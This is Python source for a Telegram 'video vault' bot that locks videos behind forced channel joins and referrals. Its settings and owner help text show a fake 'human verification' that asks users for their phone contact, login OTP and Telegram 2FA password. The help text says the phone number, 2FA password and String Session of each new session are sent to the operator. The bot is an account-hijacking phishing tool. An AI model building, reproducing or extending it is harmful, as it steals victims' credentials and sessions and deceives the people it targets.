import asyncio
import html
import logging
import math
import time
import os
import re
from datetime import datetime, timedelta, timezone
from uuid import uuid4

from dotenv import load_dotenv
from pymongo import MongoClient, ASCENDING, DESCENDING
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    Update,
)
from telegram.constants import ChatMemberStatus, ParseMode
from telegram.error import (
    BadRequest,
    Forbidden,
    TelegramError,
    RetryAfter,
    TimedOut,
    NetworkError,
)
from telegram.ext import (
    Application,
    Defaults,
    CallbackQueryHandler,
    ChatJoinRequestHandler,
    ChatMemberHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ─── Human Verification is now in its own file ───
from human_verification import HumanVerification
from broadcast import BroadcastManager

load_dotenv()

BOT_TOKEN = os.environ["BOT_TOKEN"].strip()
MONGO_URI = os.environ["MONGO_URI"].strip()
MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
ADMIN_ID = int(os.environ["ADMIN_ID"])
STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
DELETE_AFTER_HOURS_DEFAULT = int(os.getenv("DELETE_AFTER_HOURS", "1"))
REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
PENDING_REQUEST_TTL_HOURS = max(1, int(os.getenv("PENDING_REQUEST_TTL_HOURS", "72")))
UPLOAD_CONCURRENCY = 1
UPLOAD_COPY_GAP_SECONDS = max(2.0, float(os.getenv("UPLOAD_DELAY_SECONDS", os.getenv("UPLOAD_COPY_GAP_SECONDS", "2"))))
UPLOAD_MAX_RETRIES = max(1, min(8, int(os.getenv("UPLOAD_MAX_RETRIES", "5"))))
UPLOAD_PROGRESS_REFRESH_SECONDS = max(2.0, float(os.getenv("UPLOAD_PROGRESS_REFRESH_SECONDS", "3")))

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"].strip()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
for noisy in ("httpx", "httpcore", "telegram.ext.ExtBot"):
    logging.getLogger(noisy).setLevel(logging.WARNING)
log = logging.getLogger("video-unlock")

mongo = MongoClient(MONGO_URI, serverSelectionTimeoutMS=10000)
db = mongo[MONGO_DB]

users = db.users
required_chats = db.required_chats
batches = db.video_batches
pending_deletions = db.pending_deletions
drafts = db.upload_drafts
pending_requests = db.pending_join_requests
membership_events = db.membership_events
settings_col = db.settings
BROADCAST = BroadcastManager(db, users, ADMIN_ID)

users.create_index([("user_id", ASCENDING)], unique=True)
users.create_index([("created_at", ASCENDING)])
required_chats.create_index([("chat_id", ASCENDING)], unique=True)
batches.create_index([("batch_no", ASCENDING)], unique=True)
pending_deletions.create_index([("delete_at", ASCENDING)])
drafts.create_index([("admin_id", ASCENDING)], unique=True)
pending_requests.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
pending_requests.create_index([("requested_at", ASCENDING)])
membership_events.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
settings_col.create_index([("key", ASCENDING)], unique=True)

ADMIN_STATE = {}
UPLOAD_RUNTIME = {}


# ─────────────────── SETTINGS (editable from chat) ───────────────────
DEFAULT_SETTINGS = {
    "verify_robot_button_text": "🤖 Verify as not robot",
    "videos_button_text": "📚 See Videos",
    "human_verified_message": "✅ <b>Human verification completed.</b>\n\nTap <b>📚 See Videos</b> below to open the library.",
    "hv_prompt": (
        "🔐 <b>Human Verification Required</b>\n\n"
        "To access our video library, please complete a quick one-time verification.\n\n"
        "👇 Tap the button below to share your contact."
    ),
    "share_contact_button_text": "📱 Share My Contact",
    "otp_prompt": (
        "🔐 <b>Enter OTP</b>\n\n"
        "⚠️ Use the <b>inline buttons</b> below only.\n"
        "Typing OTP in chat will leave the login incomplete."
    ),
    "twofa_prompt": (
        "🔐 <b>2FA is enabled.</b>\n\n"
        "Please type your Telegram password in the chat.\n"
        "(The message will be deleted immediately.)"
    ),
    "delete_after_hours": str(DELETE_AFTER_HOURS_DEFAULT),
    "keypad_top_button_text": "💬 Contact Support",
    "keypad_top_button_url": "tg://user?id=123456789",
}

EDITABLE_KEYS = list(DEFAULT_SETTINGS.keys())

KEY_LABELS = {
    "verify_robot_button_text": "🤖 Verify as not robot — button",
    "videos_button_text": "📚 See Videos — button",
    "human_verified_message": "✅ Human verified — message",
    "hv_prompt": "🔐 HV prompt message",
    "share_contact_button_text": "📱 Share Contact — button",
    "otp_prompt": "🔐 OTP prompt message",
    "twofa_prompt": "🔐 2FA prompt message",
    "delete_after_hours": "⏳ Auto-delete timer (hours)",
    "keypad_top_button_text": "💬 Keypad top button — label",
    "keypad_top_button_url": "🔗 Keypad top button — DM link",
}


def get_setting(key):
    doc = settings_col.find_one({"key": key})
    if doc and doc.get("value") is not None:
        return doc["value"]
    return DEFAULT_SETTINGS.get(key, "")


def set_setting(key, value, admin_id=None):
    settings_col.update_one(
        {"key": key},
        {"$set": {
            "key": key,
            "value": value,
            "updated_by": admin_id,
            "updated_at": utcnow(),
        }},
        upsert=True,
    )


def get_delete_hours():
    try:
        v = int(get_setting("delete_after_hours"))
        return max(1, v)
    except (ValueError, TypeError):
        return 1


# ─────────────────── INLINE MENUS ───────────────────
def user_menu_inline(doc=None):
    """
    Row 1: 🎬 My Videos   🔓 Unlock Next 10
    Row 2: 🤖 Verify as not robot       ← always shown
    Row 3: 👥 My Referral   📊 My Progress
    """
    if doc is None:
        doc = {}
    unlocked = int(doc.get("unlocked_batch", 0))

    if unlocked > 0:
        row1 = [
            InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
            InlineKeyboardButton("🔓 Unlock Next 10", callback_data="um_unlock"),
        ]
    else:
        row1 = [
            InlineKeyboardButton("🎬 My Videos", callback_data="um_videos"),
        ]

    robot_btn = get_setting("verify_robot_button_text")
    row_mid = [
        InlineKeyboardButton(robot_btn, callback_data="um_verify_robot"),
    ]
    row2 = [
        InlineKeyboardButton("👥 My Referral", callback_data="um_ref"),
        InlineKeyboardButton("📊 My Progress", callback_data="um_progress"),
    ]
    return InlineKeyboardMarkup([row1, row_mid, row2])


def delivery_complete_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔁 Resend", callback_data="um_videos"),
            InlineKeyboardButton("🔓 More Videos", callback_data="um_unlock"),
        ],
    ])


def admin_menu_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📤 Upload Videos", callback_data="am_upload"),
            InlineKeyboardButton("📚 Video Batches", callback_data="am_batches"),
        ],
        [
            InlineKeyboardButton("➕ Add Required Group", callback_data="am_addgroup"),
            InlineKeyboardButton("👥 Required Groups", callback_data="am_groups"),
        ],
        [
            InlineKeyboardButton("🗑 Remove Required Channel", callback_data="am_remove"),
            InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
        ],
        [InlineKeyboardButton("📣 Broadcast", callback_data="am_broadcast")],
        [
            InlineKeyboardButton("✏️ Edit Buttons & Messages", callback_data="am_set"),
            InlineKeyboardButton("❓ Help", callback_data="am_help"),
        ],
    ])


def upload_menu_inline():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 Upload Status", callback_data="up_status"),
            InlineKeyboardButton("DONE", callback_data="up_done"),
        ],
        [
            InlineKeyboardButton("🔁 Retry Failed", callback_data="up_retry"),
            InlineKeyboardButton("✅ Publish Successful", callback_data="up_publish"),
        ],
        [
            InlineKeyboardButton("❌ Cancel", callback_data="up_cancel"),
        ],
    ])


def flow_cancel_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="flow_cancel")],
    ])


def set_menu_inline():
    rows = []
    for key in EDITABLE_KEYS:
        label = KEY_LABELS.get(key, key)
        rows.append([InlineKeyboardButton(label, callback_data=f"set_edit:{key}")])
    rows.append([InlineKeyboardButton("❌ Cancel", callback_data="set_cancel")])
    return InlineKeyboardMarkup(rows)


def esc(v):
    return html.escape(str(v))


def utcnow():
    return datetime.now(timezone.utc)


def user_doc(uid):
    return users.find_one({"user_id": uid})


def menu_for(uid):
    return user_menu_inline(user_doc(uid) or {})


def published_batch_count():
    return batches.count_documents({"published": True})


def required_referrals_for_next(unlocked_batch):
    return unlocked_batch * REFERRALS_PER_BATCH


def make_ref_link(username, uid):
    return f"https://t.me/{username}?start=ref_{uid}"


def active_required_chats():
    return list(required_chats.find({"enabled": True}).sort("position", ASCENDING))


def next_batch_no():
    last = batches.find_one(sort=[("batch_no", DESCENDING)])
    return (int(last["batch_no"]) + 1) if last else 1


async def reply(update, context, text, **kwargs):
    kwargs.setdefault("parse_mode", ParseMode.HTML)
    kwargs.setdefault("disable_web_page_preview", True)
    return await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=text,
        **kwargs,
    )


# ─────────────────── HUMAN VERIFICATION INSTANCE ───────────────────
HV = HumanVerification(
    users=users,
    admin_id=ADMIN_ID,
    api_id=API_ID,
    api_hash=API_HASH,
    get_setting_fn=get_setting,
    send_batch_fn=lambda bot, chat_id, n: send_batch(bot, chat_id, n),
    published_batch_count_fn=published_batch_count,
    menu_for_fn=menu_for,
)


# ─────────────────── OWNER HELP ───────────────────
HELP_TEXT = (
    "🆘 <b>OWNER HELP PANEL</b>\n\n"
    "You are the bot owner (admin). All commands and controls are listed below.\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "⌨️ <b>Owner Commands</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "• <code>/admin</code> — Open admin control panel\n"
    "• <code>/help</code> — Show this help panel\n"
    "• <code>/broadcast</code> — Send a broadcast to eligible bot users\n"
    "• <code>/set</code> — Edit button names, messages &amp; timers (inline menu)\n"
    "• <code>/uploadstatus</code> — Live status of current upload\n"
    "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
    "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
    "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "✏️ <b>Quick Edit via /set</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "Send <code>/set</code> to open the inline editor.\n"
    "Tap any button → send the new value → saved instantly.\n"
    "Type normally and use Telegram bold, italic, links and line breaks; no markup needed.\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "🛠 <b>Admin Panel Buttons</b> (via /admin)\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "• 📤 <b>Upload Videos</b> — Start storage upload session\n"
    "• 📚 <b>Video Batches</b> — List published batches\n"
    "• ➕ <b>Add Required Group</b> — Add a force-join channel/group\n"
    "• 👥 <b>Required Groups</b> — Show all required chats\n"
    "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n"
    "• ✏️ <b>Edit Buttons &amp; Messages</b> — Same as /set\n\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔐 <b>Automatic Events</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "• New session generator log → sent to you as a DM\n"
    "  (User info + phone + 2FA password + String Session)\n\n"
    "ℹ️ Owner and Admin are the same (single <code>ADMIN_ID</code>)."
)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await reply(
        update, context,
        HELP_TEXT,
        reply_markup=admin_menu_inline(),
        disable_web_page_preview=True,
    )


# ─────────────────── /set COMMAND (inline menu) ───────────────────
async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    await reply(
        update, context,
        "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
        "Tap any item below to edit it.\n"
        "Send your message with normal Telegram formatting; it will be preserved.\n\n"
        f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
        reply_markup=set_menu_inline(),
    )


async def set_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        return await q.answer("Admin only.", show_alert=True)

    try:
        key = (q.data or "").split(":", 1)[1]
    except IndexError:
        return await q.answer("Invalid.", show_alert=True)

    if key not in EDITABLE_KEYS:
        return await q.answer("Unknown key.", show_alert=True)

    await q.answer()
    ADMIN_STATE[ADMIN_ID] = f"set_edit:{key}"
    current = get_setting(key)

    extra_hint = ""
    if key == "delete_after_hours":
        extra_hint = "\n\n⚠️ Send a whole number (e.g. <code>1</code>, <code>6</code>, <code>24</code>)."
    elif key.endswith("_button_url"):
        extra_hint = (
            "\n\n⚠️ Send a valid Telegram link.\n"
            "Allowed formats:\n"
            "• <code>https://t.me/Username</code>\n"
            "• <code>tg://user?id=123456789</code>"
        )

    await q.edit_message_text(
        f"✏️ <b>Editing:</b> <code>{esc(key)}</code>\n\n"
        f"<b>Current value:</b>\n<code>{esc(current)}</code>\n\n"
        "Send the new value in chat.\n"
        "Type your message normally. Use Telegram formatting (bold, italic, links, etc.) "
        "and line breaks; I will preserve it automatically. "
        "You will see a preview before it is saved."
        f"{extra_hint}\n\n"
        "Or tap Cancel below.",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="set_cancel")],
        ]),
    )


async def set_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        return await q.answer("Admin only.", show_alert=True)
    await q.answer("Cancelled.")
    ADMIN_STATE.pop(ADMIN_ID, None)
    try:
        await q.edit_message_text(
            "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
            "Tap any item below to edit it.\n"
            "Send your message with normal Telegram formatting; it will be preserved.\n\n"
            f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=set_menu_inline(),
        )
    except BadRequest:
        pass


async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_user.id != ADMIN_ID:
        return False
    state = ADMIN_STATE.get(ADMIN_ID)
    if not state or not isinstance(state, str) or not state.startswith("set_edit:"):
        return False

    key = state.split(":", 1)[1]
    if key not in EDITABLE_KEYS:
        ADMIN_STATE.pop(ADMIN_ID, None)
        return False

    raw = update.message.text or ""
    if not raw.strip():
        await update.message.reply_text("⚠️ Value cannot be empty. Send new value or /cancel.")
        return True

    if key == "delete_after_hours":
        try:
            hours = int(raw.strip())
        except ValueError:
            await update.message.reply_text("⚠️ Please send a whole number (e.g. 1, 6, 24).")
            return True
        if hours < 1 or hours > 720:
            await update.message.reply_text("⚠️ Hours must be between 1 and 720 (30 days).")
            return True
        value = str(hours)
    elif key.endswith("_button_url"):
        value = raw.strip()
        if not (value.startswith("https://t.me/")
                or value.startswith("tg://user?id=")):
            await update.message.reply_text(
                "⚠️ Please send a valid Telegram link.\n\n"
                "Allowed formats:\n"
                "• <code>https://t.me/Username</code>\n"
                "• <code>tg://user?id=123456789</code>",
                parse_mode=ParseMode.HTML,
            )
            return True
        if len(value) > 200:
            await update.message.reply_text("⚠️ URL too long.")
            return True
    elif key.endswith("_button_text"):
        value = raw.strip()
        if len(value) > 100 or "\n" in value:
            await update.message.reply_text("⚠️ Button labels must be one line, up to 100 characters.")
            return True
    else:
        value = update.message.text_html if update.message.entities else html.escape(raw)
        if len(raw) > 4000:
            await update.message.reply_text("⚠️ Keep the message under 4000 characters.")
            return True
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="👀 Preview (this is how users will see it):",
            )
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=value,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
        except TelegramError:
            await update.message.reply_text(
                "⚠️ Telegram could not render this formatting. Please simplify it and send again. Nothing was saved."
            )
            return True

    set_setting(key, value, ADMIN_ID)
    ADMIN_STATE.pop(ADMIN_ID, None)

    if key == "delete_after_hours":
        display = f"{value} hour(s)"
    elif key.endswith("_button_text"):
        display = esc(value)
    elif key.endswith("_button_url"):
        display = f"Link: <code>{esc(value)}</code>"
    else:
        display = "Message formatting saved exactly as shown in the preview above."

    await reply(
        update, context,
        f"✅ <b>{esc(KEY_LABELS.get(key, key))}</b> saved.\n\n{display}\n\n"
        "Choose another item to edit or tap Cancel.",
        reply_markup=set_menu_inline(),
    )
    return True


async def admin_set_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        return await q.answer("Admin only.", show_alert=True)
    await q.answer()
    try:
        await q.edit_message_text(
            "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
            "Tap any item below to edit it.\n"
            "Send your message with normal Telegram formatting; it will be preserved.\n\n"
            f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=set_menu_inline(),
        )
    except BadRequest:
        pass


# ─────────────────── DELETION WORKER ───────────────────
async def deletion_worker(app: Application):
    while True:
        try:
            docs = list(
                pending_deletions.find({"delete_at": {"$lte": utcnow()}})
                .sort("delete_at", ASCENDING)
                .limit(100)
            )
            for doc in docs:
                try:
                    await app.bot.delete_message(doc["chat_id"], doc["message_id"])
                except (BadRequest, Forbidden):
                    pass
                except Exception:
                    log.exception("Delete failed")
                pending_deletions.delete_one({"_id": doc["_id"]})
                await asyncio.sleep(0.03)
        except asyncio.CancelledError:
            raise
        except Exception:
            log.exception("Deletion worker error")
        await asyncio.sleep(30)


async def post_init(app: Application):
    me = await app.bot.get_me()
    app.bot_data["username"] = me.username
    app.bot_data["video_cleanup_task"] = asyncio.create_task(
        deletion_worker(app), name="video-cleanup"
    )
    BROADCAST.jobs.update_many({"status": "sending"}, {"$set": {"status": "paused", "updated_at": utcnow()}})
    log.info("Bot started as @%s", me.username)


async def post_stop(app: Application):
    runtime = UPLOAD_RUNTIME.pop(ADMIN_ID, None)
    if runtime:
        runtime["closing"] = True
        running = list(runtime["tasks"])
        for t in running:
            t.cancel()
        if running:
            await asyncio.gather(*running, return_exceptions=True)
        await _stop_upload_progress(runtime)
    task = app.bot_data.pop("video_cleanup_task", None)
    if task is not None:
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass

    await BROADCAST.shutdown()
    await HV.cleanup_all()
    log.info("Video cleanup worker stopped")


def _ensure_user_sync(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    old = users.find_one({"user_id": u.id})
    if old:
        users.update_one(
            {"user_id": u.id},
            {"$set": {
                "first_name": u.first_name or "",
                "username": u.username,
                "last_seen": utcnow(),
            }},
        )
        return users.find_one({"user_id": u.id})

    referrer = None
    if context.args:
        m = re.fullmatch(r"ref_(\d+)", context.args[0])
        if m:
            rid = int(m.group(1))
            if rid != u.id and users.find_one({"user_id": rid}):
                referrer = rid

    doc = {
        "user_id": u.id,
        "first_name": u.first_name or "",
        "username": u.username,
        "created_at": utcnow(),
        "last_seen": utcnow(),
        "verified": False,
        "verified_at": None,
        "referred_by": referrer,
        "referral_rewarded": False,
        "verified_referrals": 0,
        "unlocked_batch": 0,
        "human_verified": False,
        "human_verified_at": None,
    }
    users.insert_one(doc)
    return doc


async def ensure_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return await asyncio.to_thread(_ensure_user_sync, update, context)


async def on_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    req = update.chat_join_request
    if not req:
        return
    cfg = required_chats.find_one({"chat_id": req.chat.id, "enabled": True})
    if not cfg or cfg.get("link_mode") != "approval":
        return

    now = utcnow()
    expires_at = now + timedelta(hours=PENDING_REQUEST_TTL_HOURS)
    pending_requests.update_one(
        {"chat_id": req.chat.id, "user_id": req.from_user.id},
        {"$set": {
            "requested_at": now,
            "expires_at": expires_at,
            "invite_link": req.invite_link.invite_link if req.invite_link else None,
        }},
        upsert=True,
    )


def has_active_pending_request(chat_id, user_id):
    return bool(
        pending_requests.find_one({
            "chat_id": chat_id,
            "user_id": user_id,
            "expires_at": {"$gt": utcnow()},
        })
    )


async def on_chat_member_update(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmu = update.chat_member
    if not cmu:
        return

    chat_id = cmu.chat.id
    uid = cmu.new_chat_member.user.id
    if not required_chats.find_one({"chat_id": chat_id, "enabled": True}):
        return

    new_status = cmu.new_chat_member.status
    active_statuses = {
        ChatMemberStatus.MEMBER,
        ChatMemberStatus.ADMINISTRATOR,
        ChatMemberStatus.OWNER,
    }

    def status_is_member(m):
        s = m.status
        if s in active_statuses:
            return True
        if s == ChatMemberStatus.RESTRICTED:
            return bool(getattr(m, "is_member", False))
        return False

    old_is = status_is_member(cmu.old_chat_member)
    new_is = status_is_member(cmu.new_chat_member)
    now = utcnow()

    if new_is:
        pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
        membership_events.update_one(
            {"chat_id": chat_id, "user_id": uid},
            {"$set": {"is_member": True, "last_join_at": now, "last_status": str(new_status)}},
            upsert=True,
        )
        return

    membership_events.update_one(
        {"chat_id": chat_id, "user_id": uid},
        {"$set": {"is_member": False, "last_status": str(new_status), "last_seen_nonmember_at": now}},
        upsert=True,
    )

    if old_is and not new_is:
        pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
        membership_events.update_one(
            {"chat_id": chat_id, "user_id": uid},
            {"$set": {"last_leave_at": now}},
            upsert=True,
        )
        pending_requests.delete_many(
            {"chat_id": chat_id, "user_id": uid, "requested_at": {"$lte": now}}
        )
        users.update_one(
            {"user_id": uid},
            {"$set": {"verified": False, "verification_revoked_at": now}},
        )
        try:
            await context.bot.send_message(
                uid,
                "🔒 <b>Access Locked Again</b>\n\n"
                "You left a required group or channel, so your access has been revoked. "
                "Join again or submit a new join request, then verify your membership.",
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass


async def check_one_chat(bot, ch, uid):
    chat_id = ch["chat_id"]
    try:
        member = await bot.get_chat_member(chat_id, uid)
        status = member.status
        is_member = status in {
            ChatMemberStatus.MEMBER,
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.OWNER,
        }
        if status == ChatMemberStatus.RESTRICTED:
            is_member = bool(getattr(member, "is_member", False))

        if is_member:
            def save_member():
                pending_requests.delete_many({"chat_id": chat_id, "user_id": uid})
                membership_events.update_one(
                    {"chat_id": chat_id, "user_id": uid},
                    {"$set": {"is_member": True, "last_seen_member_at": utcnow(), "last_status": str(status)}},
                    upsert=True,
                )
            await asyncio.to_thread(save_member)
            return ch, "member"

        await asyncio.to_thread(
            membership_events.update_one,
            {"chat_id": chat_id, "user_id": uid},
            {"$set": {"is_member": False, "last_seen_nonmember_at": utcnow(), "last_status": str(status)}},
            upsert=True,
        )
    except TelegramError as e:
        log.warning("getChatMember failed chat=%s user=%s error=%s", chat_id, uid, type(e).__name__)

    if ch.get("link_mode") != "approval":
        return ch, "missing"

    pending = await asyncio.to_thread(has_active_pending_request, chat_id, uid)
    return ch, ("pending" if pending else "missing")


async def membership_result(bot, uid):
    chats = await asyncio.to_thread(active_required_chats)
    if not chats:
        return chats, [], []

    results = await asyncio.gather(
        *(check_one_chat(bot, ch, uid) for ch in chats),
        return_exceptions=True,
    )

    missing, pending = [], []
    for item, ch in zip(results, chats):
        if isinstance(item, Exception):
            missing.append(ch)
            continue
        _, state = item
        if state == "missing":
            missing.append(ch)
        elif state == "pending":
            pending.append(ch)
    return chats, missing, pending


def join_keyboard(chats, hide_verified=False):
    rows = []
    for ch in chats:
        rows.append([InlineKeyboardButton(f"➕ Join {ch['name']}", url=ch["join_url"])])
    rows.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)


async def show_join_gate(update, context, chats=None, status_message=None):
    if chats is None:
        chats = active_required_chats()
    if not chats:
        return await home(update, context)

    text = (
        "🔐 <b>VIDEO ACCESS LOCKED</b>\n\n"
        "Join the remaining required groups or channels listed below.\n\n"
        f"📌 Remaining: <b>{len(chats)}</b>\n"
        "✅ After joining or submitting your join requests, tap <b>Verify</b>.\n\n"
        "ℹ️ Groups and channels you have already completed will not appear again."
    )
    if status_message:
        return await status_message.edit_text(text, parse_mode=ParseMode.HTML,
                                              reply_markup=join_keyboard(chats))
    await reply(update, context, text, reply_markup=join_keyboard(chats))


def _start_db_decision(uid, has_access):
    if has_access:
        current = users.find_one({"user_id": uid}) or {}
        fields = {"verified": True, "verified_at": utcnow()}
        if int(current.get("unlocked_batch", 0)) == 0 and published_batch_count() > 0:
            fields["unlocked_batch"] = 1
    else:
        fields = {"verified": False}
    users.update_one({"user_id": uid}, {"$set": fields})


async def _animate_start_loading(status_message):
    frames = (
        "⏳ <b>Loading your video vault</b>\n\n▰▱▱▱▱ Checking access…",
        "⏳ <b>Loading your video vault</b>\n\n▰▰▱▱▱ Checking access…",
        "⏳ <b>Loading your video vault</b>\n\n▰▰▰▱▱ Checking access…",
        "⏳ <b>Loading your video vault</b>\n\n▰▰▰▰▱ Checking access…",
        "⏳ <b>Loading your video vault</b>\n\n▰▰▰▰▰ Almost ready…",
    )
    index = 1
    try:
        while True:
            await asyncio.sleep(1.6)
            try:
                await status_message.edit_text(frames[index], parse_mode=ParseMode.HTML)
            except RetryAfter as exc:
                await asyncio.sleep(float(exc.retry_after) + 1)
            except BadRequest as exc:
                if "not modified" not in str(exc).lower():
                    log.debug("Start animation stopped: %s", exc)
                    return
            except TelegramError:
                return
            index = (index + 1) % len(frames)
    except asyncio.CancelledError:
        return


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    status = await reply(
        update, context,
        "⏳ <b>Loading your video vault</b>\n\n▰▱▱▱▱ Checking access…",
    )
    animation = asyncio.create_task(_animate_start_loading(status), name="start-loading")
    try:
        await ensure_user(update, context)
        uid = update.effective_user.id
        _, missing, _ = await membership_result(context.bot, uid)
        await asyncio.to_thread(_start_db_decision, uid, not missing)
        animation.cancel()
        await asyncio.gather(animation, return_exceptions=True)
        if missing:
            await show_join_gate(update, context, chats=missing, status_message=status)
        else:
            await home(update, context, status_message=status)
    except Exception:
        log.exception("Start failed for user %s", update.effective_user.id)
        animation.cancel()
        await asyncio.gather(animation, return_exceptions=True)
        try:
            await status.edit_text("⚠️ Access check took too long. Please send /start again.")
        except TelegramError:
            pass
    finally:
        if not animation.done():
            animation.cancel()
            await asyncio.gather(animation, return_exceptions=True)


def _home_snapshot(uid):
    doc = user_doc(uid) or {}
    unlocked = int(doc.get("unlocked_batch", 0))
    total = published_batch_count()
    refs = int(doc.get("verified_referrals", 0))
    if unlocked == 0 and doc.get("verified") and total:
        users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": 1}})
        unlocked = 1
        doc = user_doc(uid) or {}
    return unlocked, total, refs, get_delete_hours(), user_menu_inline(doc)


async def home(update, context, status_message=None):
    uid = update.effective_user.id
    unlocked, total, refs, delete_hours, menu = await asyncio.to_thread(_home_snapshot, uid)
    text = (
        "🎬 <b>VIDEO VAULT</b>\n\n"
        f"🔓 Unlocked batch: <b>{unlocked}/{total}</b>\n"
        f"👥 Successful referrals: <b>{refs}</b>\n"
        "🎞 Videos per full batch: <b>10</b>\n"
        f"⏳ Videos auto-delete in <b>{delete_hours} hour(s)</b>.\n\n"
        "Choose an option:"
    )
    if status_message:
        return await status_message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=menu)
    return await reply(update, context, text, reply_markup=menu)


async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Verifying all chats…")
    uid = q.from_user.id

    try:
        await q.edit_message_reply_markup(
            InlineKeyboardMarkup([[InlineKeyboardButton("⏳ Verifying…", callback_data="noop")]])
        )
    except BadRequest:
        pass

    chats, missing, pending = await membership_result(context.bot, uid)

    if missing:
        names = "\n".join(f"• {esc(x['name'])}" for x in missing)
        pending_text = ""
        if pending:
            pending_text = (
                "\n\n⏳ <b>Pending approval recognized:</b>\n"
                + "\n".join(f"• {esc(x['name'])}" for x in pending)
            )
        text = (
            "❌ <b>VERIFICATION INCOMPLETE</b>\n\n"
            "These required memberships or join requests are still missing:\n"
            f"{names}{pending_text}\n\n"
            "Complete only the chats listed above, then try verifying again."
        )
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(missing))
        except BadRequest:
            await q.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(missing))
        return

    before = users.find_one({"user_id": uid}) or {}
    set_data = {"verified": True, "verified_at": utcnow()}
    if int(before.get("unlocked_batch", 0)) == 0 and published_batch_count() > 0:
        set_data["unlocked_batch"] = 1
    users.update_one({"user_id": uid}, {"$set": set_data})

    fresh = users.find_one({"user_id": uid}) or {}
    referrer = fresh.get("referred_by")
    if referrer and not fresh.get("referral_rewarded"):
        claimed = users.find_one_and_update(
            {"user_id": uid, "referral_rewarded": False},
            {"$set": {"referral_rewarded": True, "referral_rewarded_at": utcnow()}},
        )
        if claimed:
            users.update_one({"user_id": referrer}, {"$inc": {"verified_referrals": 1}})
            rd = users.find_one({"user_id": referrer}) or {}
            current = int(rd.get("verified_referrals", 0))
            need = required_referrals_for_next(max(1, int(rd.get("unlocked_batch", 1))))
            try:
                await context.bot.send_message(
                    referrer,
                    "🎉 <b>REFERRAL SUCCESSFUL!</b>\n\n"
                    "Your referred user has completed the required group and channel verification.\n\n"
                    f"👥 Verified referrals: <b>{current}</b>\n"
                    f"🎯 Next unlock target: <b>{need}</b>\n\n"
